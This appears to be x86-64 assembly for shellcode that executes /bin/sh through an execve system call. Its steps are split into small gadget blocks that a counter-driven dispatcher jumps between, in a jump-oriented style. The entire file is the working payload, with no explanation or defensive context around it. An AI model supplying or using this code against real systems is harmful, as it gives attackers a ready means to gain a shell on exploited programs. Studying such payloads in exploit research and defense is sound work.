section .text
g1:
    xor rdx,rdx
    xor rsi,rsi
    jmp dispatcher
g2:
    mov rbx, '/bin/sh'
    push rbx
    push rsp
    pop rdi
    jmp dispatcher
g3:    
    mov rax, 0x3b
    jmp dispatcher
g4:
    syscall
dispatcher:
    inc rcx
    cmp rcx, 1
    je g1
    cmp rcx, 2
    je g2
    cmp rcx, 3
    je g3
    jmp g4
init:
    xor rcx, rcx
    jmp dispatcher
    pop rdi
    pop rsi
    pop rdx
    ret
